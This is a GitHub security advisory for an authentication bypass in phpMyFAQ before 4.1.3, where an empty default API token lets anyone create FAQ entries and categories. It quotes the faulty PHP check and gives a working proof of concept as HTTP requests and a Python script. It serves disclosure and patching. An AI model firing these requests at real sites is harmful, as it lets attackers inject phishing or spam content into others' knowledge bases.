# [H] phpMyFAQ: Default Empty API Token Authentication Bypass

## Summary
Severity: High
Advisory: GHSA-gp95-j463-vv28
CVE: CVE-2026-35672
CWE: CWE-1188
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-05-20
Source: https://github.com/advisories/GHSA-gp95-j463-vv28
Type: github-advisory

## Affected
- Packagist: `thorsten/phpmyfaq` — affected >=0 <4.1.3
- Packagist: `phpmyfaq/phpmyfaq` — affected >=0 <4.1.3

## Details
### Summary

A default empty API client token allows any unauthenticated user to create and modify FAQ entries, categories, and questions via the REST API. The vulnerability exists in all versions since API v4.0 was introduced because the installation process seeds `api.apiClientToken` with an empty string, and the `hasValidToken()` comparison logic cannot distinguish between "no token configured" and "attacker sent a matching empty token header."

### Details

The root cause is in two files:

**1. Installation default** (`src/phpMyFAQ/Setup/Installation/DefaultDataSeeder.php`, line 277-278):

```php
'api.enableAccess'   => 'true',
'api.apiClientToken' => '',       // ← defaults to empty string
```

**2. Authentication check** (`src/phpMyFAQ/Controller/AbstractController.php`, line 198-204):

```php
protected function hasValidToken(): void
{
    $request = Request::createFromGlobals();
    if ($this->configuration->get('api.apiClientToken') !== $request->headers->get('x-pmf-token')) {
        throw new UnauthorizedHttpException('"x-pmf-token" is not valid.');
    }
}
```

The method uses strict inequality (`!==`). When `api.apiClientToken` is `''` (default) and the attacker sends `x-pmf-token: ` (empty header value), the comparison becomes `'' !== ''` which evaluates to `false` — no exception is thrown, and authentication is completely bypassed.

The OpenAPI annotations confirm the developer intended these endpoints to require authentication: write endpoints are tagged `'Endpoints with Authentication'` and document HTTP 401 responses, while read-only endpoints are tagged `'Public Endpoints'`.

The following API endpoints call `$this->hasValidToken()` as their only authentication check:

| File                                                    | Endpoint               | Method |
| ------------------------------------------------------- | ---------------------- | ------ |
| `src/.../Controller/Api/FaqController.php:701-703`      | `/api/v4.0/faq/create` | `POST` |
| `src/.../Controller/Api/FaqController.php:857-859`      | `/api/v4.0/faq/update` | `PUT`  |
| `src/.../Controller/Api/CategoryController.php:278-280` | `/api/v4.0/category`   | `POST` |
| `src/.../Controller/Api/QuestionController.php:89-91`   | `/api/v4.0/question`   | `POST` |

### PoC

**Environment**: phpMyFAQ 4.2.0-alpha, PHP 8.4.16, SQLite, installed with all defaults.

**Step 1 — Verify that requests without auth header are correctly rejected:**

```http
POST /api/v4.0/faq/create HTTP/1.1
Host: <target>
Content-Type: application/json

{
    "language": "en",
    "category-id": 1,
    "question": "Test Question",
    "answer": "Test Answer",
    "keywords": "test",
    "author": "test",
    "email": "test@test.com",
    "is-active": true,
    "is-sticky": false
}
```

Response (HTTP 401 — correctly blocked):

```json
{"type":".../problems/unauthorized","title":"Unauthorized","status":401,"detail":"Unauthorized access.","instance":"/v4.0/faq/create"}
```

**Step 2 — Send the same request with an empty `x-pmf-token` header:**

```http
POST /api/v4.0/faq/create HTTP/1.1
Host: <target>
Content-Type: application/json
x-pmf-token: 

{
    "language": "en",
    "category-id": 1,
    "question": "[POC] Authentication Bypass Confirmed",
    "answer": "This FAQ was created without any valid authentication token.",
    "keywords": "poc,bypass",
    "author": "Security Researcher",
    "email": "researcher@example.com",
    "is-active": true,
    "is-sticky": false
}
```

Response (HTTP 201 — bypass confirmed):

```json
{"stored": true}
```

**Step 3 — Category creation via the same bypass:**

```http
POST /api/v4.0/category HTTP/1.1
Host: <target>
Content-Type: application/json
x-pmf-token: 

{
    "language": "en",
    "parent-id": 0,
    "category-name": "POC_Category",
    "description": "Category created via empty token bypass",
    "user-id": 1,
    "group-id": -1,
    "is-active": true,
    "show-on-homepage": true
}
```

Response (HTTP 201):

```json
{"stored": true}
```

**Step 4 — Verify injected content is publicly visible:**

```http
GET /api/v4.0/faqs/1 HTTP/1.1
Host: <target>
```

Response (HTTP 200 — injected FAQ publicly exposed):

```json
[{"record_id":1,"record_lang":"en","category_id":1,"record_title":"[POC] Authentication Bypass Confirmed","record_preview":"This FAQ was created without any valid authentication token. ..."}]
```

**PoC with Python (urllib — no external dependencies):**

```python
import urllib.request, json

TARGET = "http://<target>"
HEADERS = {"Content-Type": "application/json", "x-pmf-token": ""}

# Create FAQ via empty token bypass
data = json.dumps({
    "language": "en", "category-id": 1,
    "question": "[POC] Auth Bypass", "answer": "Created via bypass.",
    "keywords": "poc", "author": "R", "email": "r@t.com",
    "is-active": True, "is-sticky": False
}).encode()
req = urllib.request.Request(f"{TARGET}/api/v4.0/faq/create", data=data, headers=HEADERS, method="POST")
resp = urllib.request.urlopen(req)
print(f"Status: {resp.status}")  # 201 — bypass successful
```

**Overlap Summary:**

| Test                | x-pmf-token    | HTTP Status      | Result                     |
| ------------------- | -------------- | ---------------- | -------------------------- |
| No auth header      | *(not sent)*   | 401 Unauthorized | 🔒 Correctly blocked        |
| Empty token header  | `""`           | **201 Created**  | 🔓 Bypass confirmed         |
| Category creation   | `""`           | **201 Created**  | 🔓 Bypass confirmed         |
| Public verification | *(not needed)* | 200 OK           | 📄 Injected content visible |

### Impact

This is an **authentication bypass (CWE-1188)** affecting any phpMyFAQ installation where the administrator has not explicitly set a non-empty API client token — which is the **default state after installation**.

- **Who is impacted?** Any organization running phpMyFAQ with default configuration. The REST API is enabled by default, and the token defaults to empty. No action by the administrator is required for the vulnerability to exist — it is the out-of-the-box state.
- **What can an attacker do?** Create and modify FAQ entries, categories, and questions without any authentication. This enables content injection for phishing, SEO spam, reputation damage, and distribution of malicious links through the knowledge base.
- **What is NOT affected?** Read-only API endpoints are intentionally public. Session-authenticated admin endpoints are not affected. File upload and backup endpoints require separate session-based authentication.

## References
- https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-gp95-j463-vv28
- https://nvd.nist.gov/vuln/detail/CVE-2026-35672
- https://github.com/thorsten/phpMyFAQ
- https://www.vulncheck.com/advisories/phpmyfaq-authentication-bypass-via-empty-api-token
